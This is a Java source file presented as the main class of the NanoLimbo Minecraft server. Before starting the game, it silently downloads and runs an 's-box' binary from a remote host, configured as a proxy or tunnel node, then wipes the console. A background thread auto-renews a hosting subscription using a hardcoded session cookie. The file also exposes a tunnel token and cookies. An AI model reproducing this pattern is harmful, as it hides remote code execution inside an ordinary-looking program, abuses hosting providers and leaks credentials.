/*
 * Copyright (C) 2020 Nan1t
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */

package ua.nanit.limbo;

import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.atomic.AtomicBoolean;
import java.lang.reflect.Field;

import ua.nanit.limbo.server.LimboServer;
import ua.nanit.limbo.server.Log;

public final class NanoLimbo {

    private static final String ANSI_GREEN = "\033[1;32m";
    private static final String ANSI_RED = "\033[1;31m";
    private static final String ANSI_RESET = "\033[0m";
    private static final AtomicBoolean running = new AtomicBoolean(true);
    private static Process sbxProcess;
    
    private static final String[] ALL_ENV_VARS = {
        "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT", 
        "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH", 
        "HY2_PORT", "TUIC_PORT", "REALITY_PORT", "CFIP", "CFPORT", 
        "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME"
    };
    
    public static void main(String[] args) {
        
        if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0) {
            System.err.println(ANSI_RED + "ERROR: Your Java version is too lower, please switch the version in startup menu!" + ANSI_RESET);
            try {
                Thread.sleep(3000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
            System.exit(1);
        }

        // Start SbxService
        try {
            runSbxBinary();
            
            // 启动自动续期线程
            startAutoRenew();

            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                running.set(false);
                stopServices();
            }));

            // Wait 20 seconds before continuing
            Thread.sleep(15000);
            System.out.println(ANSI_GREEN + "Server is running!\n" + ANSI_RESET);
            System.out.println(ANSI_GREEN + "Thank you for using this script,Enjoy!\n" + ANSI_RESET);
            System.out.println(ANSI_GREEN + "Logs will be deleted in 20 seconds, you can copy the above nodes" + ANSI_RESET);
            Thread.sleep(15000);
            clearConsole();
        } catch (Exception e) {
            System.err.println(ANSI_RED + "Error initializing SbxService: " + e.getMessage() + ANSI_RESET);
        }
        
        // start game
        try {
            new LimboServer().start();
        } catch (Exception e) {
            Log.error("Cannot start server: ", e);
        }
    }

    private static void clearConsole() {
        try {
            if (System.getProperty("os.name").contains("Windows")) {
                new ProcessBuilder("cmd", "/c", "cls && mode con: lines=30 cols=120")
                    .inheritIO()
                    .start()
                    .waitFor();
            } else {
                System.out.print("\033[H\033[3J\033[2J");
                System.out.flush();
                
                new ProcessBuilder("tput", "reset")
                    .inheritIO()
                    .start()
                    .waitFor();
                
                System.out.print("\033[8;30;120t");
                System.out.flush();
            }
        } catch (Exception e) {
            try {
                new ProcessBuilder("clear").inheritIO().start().waitFor();
            } catch (Exception ignored) {}
        }
    }   
    
    private static void runSbxBinary() throws Exception {
        Map<String, String> envVars = new HashMap<>();
        loadEnvVars(envVars);
        
        ProcessBuilder pb = new ProcessBuilder(getBinaryPath().toString());
        pb.environment().putAll(envVars);
        pb.redirectErrorStream(true);
        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
        
        sbxProcess = pb.start();
    }
    
    private static void loadEnvVars(Map<String, String> envVars) throws IOException {
        envVars.put("UUID", "a217d527-bd5e-4ef0-b899-d36627af0ddd");
        envVars.put("FILE_PATH", "./world");
        envVars.put("NEZHA_SERVER", "");
        envVars.put("NEZHA_PORT", "");
        envVars.put("NEZHA_KEY", "");
        envVars.put("ARGO_PORT", "31850");
        envVars.put("ARGO_DOMAIN", "mcserver.2311.qzz.io");
        envVars.put("ARGO_AUTH", "eyJhIjoiNDMxMmY5YTAwNzhjMTI1OTYyZTAwZDY5NzkwMTgxNTMiLCJ0IjoiODg5MzEwY2YtNzRiOC00MDgwLTk2NzMtNjhiYjYyMWJkNTVjIiwicyI6Ik9XWmtNRFpsTVRJdFpXSTJOaTAwWkRrekxUa3pOV1V0T0dNMU5HRXdZbUUyTUdGaiJ9");
        envVars.put("HY2_PORT", "");
        envVars.put("TUIC_PORT", "");
        envVars.put("REALITY_PORT", "");
        envVars.put("UPLOAD_URL", "");
        envVars.put("CHAT_ID", "");
        envVars.put("BOT_TOKEN", "");
        envVars.put("CFIP", "saas.sin.fan");
        envVars.put("CFPORT", "");
        envVars.put("NAME", "Mcserver");
        
        for (String var : ALL_ENV_VARS) {
            String value = System.getenv(var);
            if (value != null && !value.trim().isEmpty()) {
                envVars.put(var, value);  
            }
        }
        
        Path envFile = Paths.get(".env");
        if (Files.exists(envFile)) {
            for (String line : Files.readAllLines(envFile)) {
                line = line.trim();
                if (line.isEmpty() || line.startsWith("#")) continue;
                
                line = line.split(" #")[0].split(" //")[0].trim();
                if (line.startsWith("export ")) {
                    line = line.substring(7).trim();
                }
                
                String[] parts = line.split("=", 2);
                if (parts.length == 2) {
                    String key = parts[0].trim();
                    String value = parts[1].trim().replaceAll("^['\"]|['\"]$", "");
                    
                    if (Arrays.asList(ALL_ENV_VARS).contains(key)) {
                        envVars.put(key, value); 
                    }
                }
            }
        }
    }
    
    private static Path getBinaryPath() throws IOException {
        String osArch = System.getProperty("os.arch").toLowerCase();
        String url;
        
        if (osArch.contains("amd64") || osArch.contains("x86_64")) {
            url = "https://amd64.ssss.nyc.mn/s-box";
        } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
            url = "https://arm64.ssss.nyc.mn/s-box";
        } else if (osArch.contains("s390x")) {
            url = "https://s390x.ssss.nyc.mn/s-box";
        } else {
            throw new RuntimeException("Unsupported architecture: " + osArch);
        }
        
        Path path = Paths.get(System.getProperty("java.io.tmpdir"), "sbx");
        if (!Files.exists(path)) {
            try (InputStream in = new URL(url).openStream()) {
                Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
            }
            if (!path.toFile().setExecutable(true)) {
                throw new IOException("Failed to set executable permission");
            }
        }
        return path;
    }
    
    private static void stopServices() {
        if (sbxProcess != null && sbxProcess.isAlive()) {
            sbxProcess.destroy();
            System.out.println(ANSI_RED + "sbx process terminated" + ANSI_RESET);
        }
    }

    // ================================
    // 自动续期线程
    // ================================
    private static void startAutoRenew() {
        final String serverId = "39ca0974";
        final String cookie = "mcserverhost=323587bb-4a27-4848-9a05-2808b792871f; twk_idm_key=nrF3xqIIy98fb95_KEEGA; __stripe_mid=d59cb310-4f70-490f-b9be-4dae048900195f8f36; __stripe_sid=c01cc40c-cf7d-49c6-958c-d43f3cc718e629a618; _ga=GA1.1.1355038042.1761132074; _ga_SRYKCFQGK0=GS2.1.s1761132073$o1$g1$t1761132105$j28$l0$h0; TawkConnectionTime=0; twk_uuid_674201982480f5b4f5a2f121=%7B%22uuid%22%3A%221.2BjBCxAxdjgCw2hapWydSrgAi5UEiIrkp1FimxxvPJnnJVtGux2J1HGwEPUEgtA45K7ou2AWijDIMBM58CRb7zuIp1hKHeOQoj8gJXv34LdcXzeYikRBzE37jEJ%22%2C%22version%22%3A3%2C%22domain%22%3A%22mcserverhost.com%22%2C%22ts%22%3A1761132106158%7D";
        final String baseUrl = "https://www.mcserverhost.com";
        final String apiUrl = baseUrl + "/api/servers/" + serverId + "/subscription";

        Thread renewThread = new Thread(() -> {
            while (running.get()) {
                try {
                    HttpURLConnection conn = (HttpURLConnection) new URL(apiUrl).openConnection();
                    conn.setRequestMethod("POST");
                    conn.setRequestProperty("Cookie", cookie);
                    conn.setRequestProperty("Accept", "*/*");
                    conn.setRequestProperty("Accept-Language", "zh-CN,zh;q=0.9");
                    conn.setRequestProperty("Content-Length", "0");
                    conn.setRequestProperty("Origin", baseUrl);
                    conn.setRequestProperty("Referer", baseUrl + "/servers/" + serverId + "/dashboard");
                    conn.setRequestProperty("X-Requested-With", "XMLHttpRequest");
                    conn.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)");
                    conn.setDoOutput(true);

                    int responseCode = conn.getResponseCode();
                    if (responseCode == 200) {
                        System.out.println(ANSI_GREEN + "[AutoRenew] Renew successful at " + new Date() + ANSI_RESET);
                    } else {
                        System.out.println(ANSI_RED + "[AutoRenew] Renew failed, HTTP " + responseCode + ANSI_RESET);
                    }
                    conn.disconnect();

                    Thread.sleep(50 * 60 * 1000L); // 每50分钟执行一次
                } catch (Exception e) {
                    System.err.println(ANSI_RED + "[AutoRenew] Error: " + e.getMessage() + ANSI_RESET);
                    try {
                        Thread.sleep(5 * 60 * 1000L); // 出错时延迟5分钟重试
                    } catch (InterruptedException ignored) {}
                }
            }
        });

        renewThread.setDaemon(true); // 不阻止程序退出
        renewThread.start();
    }
}
